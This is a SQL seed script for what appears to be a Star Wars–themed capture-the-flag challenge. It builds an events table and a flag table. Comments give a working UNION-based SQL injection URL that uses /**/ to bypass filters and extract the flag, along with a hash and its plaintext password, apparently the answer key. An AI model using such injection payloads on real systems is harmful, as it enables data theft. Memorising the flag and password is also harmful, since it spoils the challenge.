USE silicon;

CREATE TABLE events (
event_name char(64) NOT NULL,
event_desc char(128) NOT NULL,
event_date int(11)
);

CREATE TABLE flag_t (
id int,
flag char(64)
);


INSERT INTO events VALUES ('Orientation','Storm Trooper Orientation for new Recruits',1626800400);
INSERT INTO events VALUES ('Meet and Greet','Meet your Sith Overlords!',1626804000);
INSERT INTO events VALUES ('Target Practice','Please show up this time!',1626811200);
INSERT INTO events VALUES ('Happy Hour','Storm Trooper Orientation for new Recruits',1626825600);

INSERT INTO flag_t VALUES (1,'silicon{Its_there_even_if_you_cant_see_it}');

-- http://localhost:8234/event_details?event=Orientation%27/**/union/**/select/**/flag,null/**/from/**/flag_t/**/where/**/%27a%27=%27a

-- Full hash: 2fdde255d49fe7fc6f3323614bb55994c55db86142df93c2e4cb11570521fe54
-- Actual password: nHMx.z3iYN*A7WsGJCH